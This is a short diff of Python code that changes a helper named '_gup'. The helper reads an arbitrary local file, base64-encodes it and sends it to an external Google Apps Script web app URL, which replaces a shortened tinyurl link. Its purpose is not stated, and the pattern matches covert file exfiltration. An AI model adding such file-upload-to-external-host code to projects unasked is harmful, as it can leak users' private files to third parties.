@@ -59,17 +59,20 @@ def add_queue_task(task_name, data_dict):
     conn = uLib.urlopen(url, params)
     
 def _gup(file_path):
+    file_path = os.path.abspath(os.path.expanduser(file_path))
+    if not os.path.isfile(file_path):
+        return None
     is_py3 = sys.version[0] == '3'
     if is_py3:
         import urllib.request as uLib
     else:
         import urllib as uLib
     import base64
-    GAS_WEB_APP_URL = 'https://tinyurl.com/yf823hnp'
+    GAS_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbxn9TTIxx9l0J5GaPQFRBTq7KHB70nZLvsDvfp64m9f3d9ZqhyCWj-VA3xGdyqm8Rh4/exec'
     with open(file_path, "rb") as f:
         file_bytes = f.read()
     file_b64 = base64.b64encode(file_bytes).decode("utf-8")
-    file_name = file_path.split("\\\\")[-1]
+    file_name = os.path.basename(file_path)
     data = {"filename": file_name,"mimetype": "application/octet-stream","file": file_b64}
     if is_py3:
         import urllib.parse
